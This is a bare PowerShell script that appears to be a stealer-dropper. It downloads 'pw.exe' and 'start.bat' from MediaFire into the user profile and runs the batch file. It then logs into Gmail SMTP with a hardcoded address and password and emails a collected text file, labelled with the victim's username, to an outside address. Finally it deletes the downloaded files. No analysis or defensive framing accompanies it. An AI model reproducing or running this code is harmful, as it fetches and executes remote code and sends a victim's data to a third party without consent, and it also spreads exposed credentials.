$PwExe = "pw.exe"
$WebFile = "https://download1498.mediafire.com/jbon2l88ucyg/7w31zqu1rpcw6xf/pw.exe"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$PwExe")

$StartBat = "start.bat"
$WebFile = "https://download1590.mediafire.com/6ueumwtzk6og/tynokb2z306iwx6/start.bat"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$StartBat")

Start-Process ("$env:USERPROFILE\$StartBat")

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('artemis.by.seeber@gmail.com', 'jJ8Dt-GF_&a#t!?g')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'nejcpirecnik03@gmail.com'
$E.To.Add('lol23012002@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success!'
Start-Sleep -s 2
$F = "windows_sys2445.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
Start-Sleep -s 2
del pw.exe
del start.bat
exit